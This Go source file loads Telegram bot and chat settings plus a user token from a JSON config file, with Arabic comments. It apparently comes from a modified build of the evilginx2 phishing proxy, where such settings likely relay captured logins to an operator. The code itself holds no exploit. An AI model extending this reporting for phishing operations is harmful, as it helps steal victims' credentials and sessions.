package core

import (
	"encoding/json"
	"os"
	"path/filepath"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramConfig struct {
	BotToken string `json:"bot_token"`
	ChatID   string `json:"chat_id"`
}

type AuthConfig struct {
	UserToken string `json:"userToken"`
}

type UserConfig struct {
	Telegram TelegramConfig `json:"telegram"`
	Auth     AuthConfig     `json:"auth"`
}

// LoadUserConfig يقوم بتحميل إعدادات المستخدم من ملف userConfig.json
func LoadUserConfig() (*UserConfig, error) {
	// الحصول على المسار الحالي للتطبيق
	exePath, err := os.Executable()
	if err != nil {
		return nil, err
	}
	
	exeDir := filepath.Dir(exePath)
	configPath := filepath.Join(exeDir, "userConfig.json")
	
	// التحقق أولاً من وجود الملف في المسار الحالي
	if _, err := os.Stat("userConfig.json"); err == nil {
		configPath = "userConfig.json"
	}
	
	// قراءة الملف
	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, err
	}
	
	var config UserConfig
	err = json.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}
	
	return &config, nil
}

// GetTelegramConfig يقوم باسترجاع إعدادات التليجرام من ملف التكوين المخصص
// إذا فشلت عملية القراءة، يقوم بإرجاع القيم الافتراضية
func GetTelegramConfig(defaultToken, defaultChatID string) (string, string) {
	config, err := LoadUserConfig()
	if err != nil {
		log.Warning("فشل في قراءة ملف إعدادات المستخدم: %v", err)
		log.Info("استخدام القيم الافتراضية للتليجرام")
		return defaultToken, defaultChatID
	}
	
	// استخدام القيم من ملف التكوين إذا كانت متوفرة
	botToken := config.Telegram.BotToken
	chatID := config.Telegram.ChatID
	
	// العودة للقيم الافتراضية إذا كانت القيم في الملف فارغة
	if botToken == "" {
		botToken = defaultToken
	}
	if chatID == "" {
		chatID = defaultChatID
	}
	
	return botToken, chatID
} 